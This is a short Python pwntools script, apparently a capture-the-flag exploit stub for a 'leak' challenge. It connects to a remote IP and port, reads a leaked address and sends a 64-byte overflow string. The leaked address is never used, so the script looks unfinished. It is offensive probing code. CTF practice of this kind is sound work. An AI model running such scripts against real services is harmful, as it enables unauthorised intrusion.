from pwn import *

context.log_level = 'error'

p = remote('185.125.168.82', 1234)
# p = process('./handout/leak')

p.recvuntil(b"-> ")
address = p.recvuntil(b"\n").decode().strip()
p.recvuntil(b"!\n")
p.sendline(b"A"*64)
p.close()